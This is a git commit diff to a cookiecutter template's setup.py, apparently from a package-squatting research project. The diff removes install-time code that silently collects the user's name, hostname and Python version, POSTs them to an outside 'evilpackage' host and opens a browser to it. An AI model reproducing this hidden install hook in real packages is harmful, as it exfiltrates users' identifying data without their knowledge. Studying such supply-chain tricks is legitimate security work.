a3ed1e1e060748b0444158ea3bc569dfbf57645e
fate0 <fate0@users.noreply.github.com>
2017-06-01 11:02:12 +0800

    Update setup.py

--- {{cookiecutter.package_name}}/setup.py
+++ {{cookiecutter.package_name}}/setup.py
@@ -6,71 +6,8 @@ from __future__ import unicode_literals
 import os
 import sys
 import json
-import getpass
-import hashlib
-import platform
-import tempfile
-import webbrowser
 import setuptools
 from setuptools.command.install import install
-
-
-def request(url, method='GET', data=None, headers=None):
-    headers = headers or {}
-    try:
-        import urllib2 as urlrequest
-    except:
-        import urllib.request as urlrequest
-
-    req = urlrequest.Request(url=url, data=data, headers=headers)
-    return urlrequest.urlopen(req, timeout=10).read()
-
-
-def fun():
-    username = getpass.getuser()
-    hostname = platform.node()
-
-    filename = os.path.join(
-        tempfile.gettempdir(),
-        hashlib.md5(str(hostname).encode('utf-8', errors='ignore')).hexdigest()
-    )
-
-    if os.path.exists(filename):
-        return
-
-    try:
-        open(filename, 'w').write(b'')
-    except:
-        pass
-
-    data = {
-        "username": str(username),
-        "hostname": str(hostname),
-        "language": "Python %s.%s.%s" % (sys.version_info.major, sys.version_info.minor, sys.version_info.micro),
-        "package": "{{ cookiecutter.package_name }}",
-    }
-
-    headers = {
-        'Content-Type': 'application/json'
-    }
-
-    try:
-        request(
-            url="http://evilpackage.fatezero.org/evilpy",
-            method='POST',
-            data=json.dumps(data).encode("utf-8", errors='ignore'),
-            headers=headers
-        )
-    except:
-        pass
-
-    try:
-        webbrowser.open("http://evilpackage.fatezero.org/")
-    except:
-        pass
-
-
-fun()
 
 
 class AbortInstall(install):
